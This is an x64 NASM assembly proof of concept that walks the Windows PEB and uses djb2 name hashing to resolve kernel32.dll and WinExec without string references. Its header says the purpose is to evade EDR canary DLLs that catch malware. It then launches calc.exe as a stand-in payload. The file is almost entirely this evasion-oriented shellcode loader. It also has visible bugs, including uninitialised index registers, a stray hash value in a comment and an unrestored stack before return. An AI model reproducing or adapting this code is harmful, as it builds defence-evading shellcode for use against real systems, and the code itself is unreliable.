; Author: wizardy0ga
; September 12th 2026
;  
; Uses djb2 hashing to locate kernel32.dll from the PEB, bypassing potential canary
; dlls placed by EDRs intended to catch malware using static dereferencing of the 
; InLoad/Memory/Initialization/OrderModuleList to reach kernel32 & ntdll. Finally,
; it locates and executes WinExec to populate a calculator
;
; Assemble: nasm -f win64 pebwalk-hash-k32-parse.x64.asm
; Link: link.exe /subsystem:console /entry:main pebwalk-hash-k32-parse.x64.obj
;
bits 64
default rel
global main

section .text

main:
    ; Step 1. Locate kernel32.dll in the process environment block
    ;
    xor rax, rax
    mov rax, [gs:0x60]          ; rax = PEB
    mov rax, [rax + 0x18]       ; rax = PEB->LDR
    mov rax, [rax + 0x10]       ; rax = PEB->Ldr->InLoadOrderModuleList->Flink [this.exe]
get_base_dll_name:
    mov r15, rax                ; r15 = PEB->Ldr->InLoadOrderModuleList->Flink
                                ; - Must preserve the value of rax which holds current position in Ldr linked list
    mov rcx, [rax + 0x60]       ; rcx = LDR_DATA_TABLE_ENTRY->BaseDllName 
    sub rsp, 0x28
    call djb2_hashw             ; Hash the dll name
    add rsp, 0x28
    cmp eax, 0x6DDB9555         ; Check if hash is L"KERNEL32.DLL"
    je found_kernel_32          
    mov rax, [r15]              ; Continue to next link [LDR_DATA_TABLE_ENTRY]
    jmp get_base_dll_name

    ; Step 2. Get the IMAGE_EXPORT_DIRECTORY location from kernel32
    ;
found_kernel_32:
    mov r15, [r15 + 0x30]       ; r15 = (LDR_DATA_TABLE_ENTRY)Kernel32.DllBase
    mov r14d, [r15 + 0x3C]      ; r14d = e_lfanew (Kernel32 Dos Header)
    add r14, r15                ; r14 = IMAGE_NT_HEADER
    add r14, 0x88               ; r14 = NtHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
    mov r14d, [r14]             ; r14d = IMAGE_DIRECTORY_ENTRY_EXPORT.VirtualAddress (RVA)
    add r14, r15                ; r14 = IMAGE_EXPORT_DIRECTORY

    ; Step 3. Locate WinExec from export dir
    ;
    mov r13d, [r14 + 0x20]      ; r13d = ExportDirectory.AddressOfNames RVA
    add r13, r15                ; r13 = ExportDirectory.AddressOfNames
begin_function_search:
    mov ecx, [r13 + r12 * 4]    ; ecx = Function Name RVA
    add rcx, r15                ; rcx = Function Name
    sub rsp, 0x28
    call djb2_hash
    add rsp, 0x28
    cmp rax, 0x29A65678         ; Check if resulting hash is "WinExec"
    je found_function
    cmp r12, [r14 + 0x14]       ; r14 + 0x14 = ExportDirectory.NumberOfFunctions
                                ; Checking if we've reached the last function export
    je export_limit_reached 
    inc r12                     ; increment position within the AddressOfNames RVA array
    jmp begin_function_search
export_limit_reached:
    ret

    ; Step 4. Execute the winexec function 
    ; 
found_function:
    mov r11d, [r14 + 0x24]      ; r11 = ExportDirectory.AddressOfOrdinals RVA
    add r11, r15                ; r11 = ExportDirectory.AddressOfOrdinals
    mov ax, [r11 + r12 * 2]     ; ax  = Target Function Ordinal
    mov r10d, [r14 + 0x1C]      ; r10d = AddressOfFunctions RVA
    add r10, r15                ; r10 = ExportDirectory.AddressOfFunctions
    mov ebx, [r10 + r12 * 4]    ; ebx = Target Function RVA
    add rbx, r15                ; rbx = Target Function (WinExec)
    lea rcx, [rel commandline]  ; rcx = lpCmdLine
    mov rdx, 1                  ; rdx = uCmdShow (SW_SHOWNORMAL)
    sub rsp, 0x28
    call rbx                    ; WinExec("calc.exe", SW_SHOWNORMAL)
    ret

djb2_hash:
    mov eax, 0x1505  ; rdx = base hash
hash:
    mov sil, [rcx + r11]        ; sil = &"WinExec"[r11]
    cmp sil, 0                  ; null terminator check
    je djb2_epilogue            ; if null terminator found, jump to completion
    mov r8d, eax                ; Preserve hash from prior round
    shl eax, 5                  ; eax = (hash << 5)
    add eax, r8d                ; eax = ((hash << 5) + hash)
    add eax, esi                ; eax = ((hash << 5) + hash) + c
    inc r11                     ; increment string position index 
    jmp hash                    ; hash next byte

djb2_hashw:
    mov eax, 0x1505             ; rdx = base hash
hashw:
    mov si, [rcx + r11 * 2]     ; si = &L"WinExec"[r11]
    cmp si, 0                   ; null terminator check
    je djb2_epilogue            ; if null terminator found, jump to completion
    mov r8d, eax                ; Preserve hash from prior round
    shl eax, 5                  ; eax = (hash << 5)
    add eax, r8d                ; eax = ((hash << 5) + hash)0x29A65678
    add eax, esi                ; eax = ((hash << 5) + hash) + c
    inc r11                     ; increment string position index 
    jmp hashw                   ; hash next wide char
djb2_epilogue:
    xor r11, r11                ; r11 = 0; clear index register
    ret

commandline:
    db "calc.exe", 0